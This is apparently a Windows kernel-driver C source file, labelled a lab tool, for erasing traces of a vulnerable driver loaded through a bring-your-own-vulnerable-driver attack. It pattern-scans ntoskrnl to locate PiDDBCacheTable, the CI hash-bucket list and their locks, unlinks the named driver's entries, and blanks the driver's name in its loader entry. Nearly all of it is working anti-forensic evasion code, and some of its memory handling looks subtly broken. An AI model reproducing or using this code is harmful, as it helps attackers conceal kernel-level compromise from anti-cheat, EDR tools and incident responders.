// Kernel trace scrub for BYOVD-mapped RwTest (lab). Uses only ntoskrnl exports + pattern scan.

#include <ntifs.h>
#include <ntimage.h>

#ifndef offsetof
#define offsetof(s, m) ((SIZE_T)&(((s*)0)->m))
#endif

typedef struct _PiDDBCacheEntry {
    LIST_ENTRY List;
    UNICODE_STRING DriverName;
    ULONG TimeDateStamp;
    NTSTATUS LoadStatus;
    UCHAR _pad[16];
} PiDDBCacheEntry, *PPiDDBCacheEntry;

typedef struct _RTL_AVL_TABLE {
    RTL_BALANCED_LINKS BalancedRoot;
    PVOID OrderedPointer;
    ULONG WhichOrderedElement;
    ULONG NumberGenericTableElements;
    ULONG DepthOfTree;
    PVOID RestartKey;
    ULONG DeleteCount;
    PVOID CompareRoutine;
    PVOID AllocateRoutine;
    PVOID FreeRoutine;
    PVOID TableContext;
} RTL_AVL_TABLE, *PRTL_AVL_TABLE;

typedef struct _HashBucketEntry {
    struct _HashBucketEntry* Next;
    UNICODE_STRING DriverName;
    ULONG CertHash[5];
} HashBucketEntry, *PHashBucketEntry;

typedef NTSTATUS (NTAPI *pfnExAcquireResourceExclusiveLite)(PVOID, BOOLEAN);
typedef NTSTATUS (NTAPI *pfnExReleaseResourceLite)(PVOID);
typedef PVOID (NTAPI *pfnRtlLookupElementGenericTableAvl)(PRTL_AVL_TABLE, PVOID);
typedef BOOLEAN (NTAPI *pfnRtlDeleteElementGenericTableAvl)(PRTL_AVL_TABLE, PVOID);

typedef struct _MOD_ENTRY {
    HANDLE Section;
    PVOID MappedBase, ImageBase;
    ULONG ImageSize, Flags;
    USHORT LoadOrderIndex, InitOrderIndex, LoadCount, OffsetToFileName;
    CHAR FullPathName[256];
} MOD_ENTRY;

typedef struct _MOD_LIST {
    ULONG Count;
    MOD_ENTRY Modules[1];
} MOD_LIST;

typedef NTSTATUS (NTAPI *pfnZwQSI)(ULONG, PVOID, ULONG, PULONG);

static BOOLEAN FindModuleByName(const CHAR* target, PULONG64 base, PULONG64 end)
{
    UNICODE_STRING fn;
    RtlInitUnicodeString(&fn, L"ZwQuerySystemInformation");
    pfnZwQSI qsi = (pfnZwQSI)MmGetSystemRoutineAddress(&fn);
    if (!qsi) return FALSE;

    ULONG needed = 0;
    qsi(0x0B, NULL, 0, &needed);
    needed += 0x2000;

    PVOID buf = ExAllocatePool2(POOL_FLAG_PAGED, needed, 'rTsR');
    if (!buf) return FALSE;

    if (!NT_SUCCESS(qsi(0x0B, buf, needed, &needed))) {
        ExFreePool(buf);
        return FALSE;
    }

    MOD_LIST* mods = (MOD_LIST*)buf;
    BOOLEAN found = FALSE;
    for (ULONG i = 0; i < mods->Count; i++) {
        MOD_ENTRY* m = &mods->Modules[i];
        const CHAR* n = m->FullPathName + m->OffsetToFileName;
        if (_stricmp(n, target) == 0) {
            *base = (ULONG64)m->ImageBase;
            *end = *base + m->ImageSize;
            found = TRUE;
            break;
        }
    }
    ExFreePool(buf);
    return found;
}

static PVOID ResolveRel(PVOID instr, ULONG ripOff, ULONG instrSize)
{
    __try {
        LONG disp = *(PLONG)((PUCHAR)instr + ripOff);
        return (PUCHAR)instr + instrSize + disp;
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return NULL;
    }
}

static PVOID ScanNtSection(ULONG64 ntBase, ULONG ntSize, const UCHAR* pat, const CHAR* mask, SIZE_T patLen)
{
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntBase;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(ntBase + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, "PAGE", 4) != 0 && memcmp(sec[i].Name, "PAGE", 5) != 0) {
            if (sec[i].Name[0] != 'P' || sec[i].Name[1] != 'A') continue;
        }
        PUCHAR start = (PUCHAR)ntBase + sec[i].VirtualAddress;
        ULONG size = sec[i].Misc.VirtualSize;
        if (size > ntSize) size = ntSize;

        for (ULONG off = 0; off + patLen <= size; off++) {
            BOOLEAN ok = TRUE;
            __try {
                for (SIZE_T j = 0; j < patLen; j++) {
                    if (mask[j] != '?' && start[off + j] != pat[j]) { ok = FALSE; break; }
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                ok = FALSE;
            }
            if (ok) return start + off;
        }
    }
    return NULL;
}

static BOOLEAN ScrubPiDdb(const WCHAR* driverName, ULONG timeDateStamp)
{
    UNICODE_STRING u;
    pfnExAcquireResourceExclusiveLite pLock = NULL;
    pfnExReleaseResourceLite pUnlock = NULL;
    pfnRtlLookupElementGenericTableAvl pLookup = NULL;
    pfnRtlDeleteElementGenericTableAvl pDelete = NULL;

    RtlInitUnicodeString(&u, L"ExAcquireResourceExclusiveLite");
    pLock = (pfnExAcquireResourceExclusiveLite)MmGetSystemRoutineAddress(&u);
    RtlInitUnicodeString(&u, L"ExReleaseResourceLite");
    pUnlock = (pfnExReleaseResourceLite)MmGetSystemRoutineAddress(&u);
    RtlInitUnicodeString(&u, L"RtlLookupElementGenericTableAvl");
    pLookup = (pfnRtlLookupElementGenericTableAvl)MmGetSystemRoutineAddress(&u);
    RtlInitUnicodeString(&u, L"RtlDeleteElementGenericTableAvl");
    pDelete = (pfnRtlDeleteElementGenericTableAvl)MmGetSystemRoutineAddress(&u);
    if (!pLock || !pUnlock || !pLookup || !pDelete) return FALSE;

    ULONG64 ntBase = 0, ntEnd = 0;
    if (!FindModuleByName("ntoskrnl.exe", &ntBase, &ntEnd)) return FALSE;

    const UCHAR patLock1[] = { 0x8B,0xD8,0x85,0xC0,0x0F,0x88,0x00,0x00,0x00,0x00,0x65,0x48,0x8B,0x04,0x25,0x00,0x00,0x00,0x00,
        0x66,0xFF,0x88,0x00,0x00,0x00,0x00,0xB2,0x01,0x48,0x8D,0x0D,0x00,0x00,0x00,0x00,0xE8,0x00,0x00,0x00,0x00,0x4C,0x8B,0x00,0x24 };
    const CHAR mLock1[] = "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x";

    PVOID pLockInstr = ScanNtSection(ntBase, (ULONG)(ntEnd - ntBase), patLock1, mLock1, sizeof(patLock1));
    ULONG lockAdj = 28;
    if (!pLockInstr) {
        const UCHAR patLock2[] = { 0x48,0x8B,0x0D,0x00,0x00,0x00,0x00,0x48,0x85,0xC9,0x0F,0x85,0x00,0x00,0x00,0x00,
            0x48,0x8D,0x0D,0x00,0x00,0x00,0x00,0xE8,0x00,0x00,0x00,0x00,0xE8 };
        const CHAR mLock2[] = "xxx????xxxxx????xxx????x????x";
        pLockInstr = ScanNtSection(ntBase, (ULONG)(ntEnd - ntBase), patLock2, mLock2, sizeof(patLock2));
        lockAdj = 16;
    }
    if (!pLockInstr) {
        const UCHAR patLock3[] = { 0x8B,0xD8,0x85,0xC0,0x0F,0x88,0x00,0x00,0x00,0x00,0x65,0x48,0x8B,0x04,0x25,0x00,0x00,0x00,0x00,
            0x48,0x8D,0x0D,0x00,0x00,0x00,0x00,0xB2,0x01,0x66,0xFF,0x88,0x00,0x00,0x00,0x00,0x90,0xE8,0x00,0x00,0x00,0x00,0x4C,0x8B,0x00,0x24 };
        const CHAR mLock3[] = "xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x";
        pLockInstr = ScanNtSection(ntBase, (ULONG)(ntEnd - ntBase), patLock3, mLock3, sizeof(patLock3));
        lockAdj = 19;
    }
    if (!pLockInstr) return FALSE;
    pLockInstr = (PUCHAR)pLockInstr + lockAdj;

    const UCHAR patTbl[] = { 0x66,0x03,0xD2,0x48,0x8D,0x0D };
    const CHAR mTbl[] = "xxxxxx";
    PVOID pTblInstr = ScanNtSection(ntBase, (ULONG)(ntEnd - ntBase), patTbl, mTbl, sizeof(patTbl));
    if (!pTblInstr) {
        const UCHAR patTbl2[] = { 0x48,0x8B,0xF9,0x33,0xC0,0x48,0x8D,0x0D };
        const CHAR mTbl2[] = "xxxxxxxx";
        pTblInstr = ScanNtSection(ntBase, (ULONG)(ntEnd - ntBase), patTbl2, mTbl2, sizeof(patTbl2));
        if (pTblInstr) pTblInstr = (PUCHAR)pTblInstr + 2;
    }
    if (!pTblInstr) return FALSE;

    PVOID piDdbLock = ResolveRel(pLockInstr, 3, 7);
    PRTL_AVL_TABLE piDdbTable = (PRTL_AVL_TABLE)ResolveRel(pTblInstr, 6, 10);
    if (!piDdbLock || !piDdbTable) return FALSE;

    if (!NT_SUCCESS(pLock(piDdbLock, TRUE))) return FALSE;

    PiDDBCacheEntry local = { 0 };
    RtlInitUnicodeString(&local.DriverName, driverName);
    local.TimeDateStamp = timeDateStamp;

    PPiDDBCacheEntry found = (PPiDDBCacheEntry)pLookup(piDdbTable, &local);
    if (!found) {
        pUnlock(piDdbLock);
        return FALSE;
    }

    PLIST_ENTRY prev = found->List.Blink;
    PLIST_ENTRY next = found->List.Flink;
    if (prev && next) {
        prev->Flink = next;
        next->Blink = prev;
    }

    BOOLEAN deleted = pDelete(piDdbTable, found);
    if (deleted && piDdbTable->DeleteCount > 0)
        piDdbTable->DeleteCount--;

    pUnlock(piDdbLock);
    return deleted ? TRUE : FALSE;
}

static BOOLEAN ScrubCiHashBucket(const WCHAR* driverName)
{
    ULONG64 ntBase = 0, ntEnd = 0;
    if (!FindModuleByName("ntoskrnl.exe", &ntBase, &ntEnd)) return FALSE;

    const UCHAR sigPat[] = { 0x48,0x8D,0x0D,0x00,0x00,0x00,0x00,0xE8,0x00,0x00,0x00,0x00,0x8B,0x0D,0x00,0x00,0x00,0x00,0xE8,0x00,0x00,0x00,0x00,0x48,0x8B,0x0D };
    const CHAR sigMask[] = "xxx????x????xx????x????xxx";

    PVOID sig = ScanNtSection(ntBase, (ULONG)(ntEnd - ntBase), sigPat, sigMask, sizeof(sigPat));
    if (!sig) return FALSE;

    PVOID hashList = ResolveRel(sig, 3, 7);
    if (!hashList) return FALSE;

    PVOID lockInstr = (PUCHAR)sig - 50;
    const UCHAR lockPat[] = { 0x48,0x8D,0x0D };
    const CHAR lockMask[] = "xxx";
    PVOID lockHit = NULL;
    for (int i = 0; i < 50; i++) {
        __try {
            if (lockInstr && ((PUCHAR)lockInstr)[0] == 0x48 && ((PUCHAR)lockInstr)[1] == 0x8D && ((PUCHAR)lockInstr)[2] == 0x0D) {
                lockHit = lockInstr;
                break;
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) { }
        lockInstr = (PUCHAR)lockInstr + 1;
    }
    if (!lockHit) return FALSE;

    PVOID hashLock = ResolveRel(lockHit, 3, 7);
    if (!hashLock) return FALSE;

    UNICODE_STRING u;
    pfnExAcquireResourceExclusiveLite pLock = NULL;
    pfnExReleaseResourceLite pUnlock = NULL;
    RtlInitUnicodeString(&u, L"ExAcquireResourceExclusiveLite");
    pLock = (pfnExAcquireResourceExclusiveLite)MmGetSystemRoutineAddress(&u);
    RtlInitUnicodeString(&u, L"ExReleaseResourceLite");
    pUnlock = (pfnExReleaseResourceLite)MmGetSystemRoutineAddress(&u);
    if (!pLock || !pUnlock) return FALSE;
    if (!NT_SUCCESS(pLock(hashLock, TRUE))) return FALSE;

    UNICODE_STRING target;
    RtlInitUnicodeString(&target, driverName);

    PHashBucketEntry head = *(PHashBucketEntry*)hashList;
    PHashBucketEntry prev = (PHashBucketEntry)hashList;
    PHashBucketEntry entry = head;
    BOOLEAN hit = FALSE;

    while (entry) {
        __try {
            if (entry->DriverName.Buffer && entry->DriverName.Length) {
                if (RtlEqualUnicodeString(&entry->DriverName, &target, TRUE)) {
                    prev->Next = entry->Next;
                    hit = TRUE;
                    break;
                }
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) { break; }
        prev = entry;
        entry = entry->Next;
    }

    pUnlock(hashLock);
    return hit;
}

NTSTATUS RwTestScrubVehicleTraces(PDRIVER_OBJECT byovdDriver, ULONG flags,
    const WCHAR* driverName, ULONG timeDateStamp)
{
    BOOLEAN any = FALSE;

    if (flags & 0x01)
        any |= ScrubPiDdb(driverName, timeDateStamp);

    if (flags & 0x02)
        any |= ScrubCiHashBucket(driverName);

    if ((flags & 0x04) && byovdDriver && byovdDriver->DriverSection) {
        __try {
            PUCHAR sec = (PUCHAR)byovdDriver->DriverSection;
            PUSHORT nameLen = (PUSHORT)(sec + 0x58);
            if (*nameLen > 0 && *nameLen < 512) {
                *nameLen = 0;
                any = TRUE;
            }
        } __except (EXCEPTION_EXECUTE_HANDLER) { }
    }

    UNREFERENCED_PARAMETER(timeDateStamp);
    return any ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}
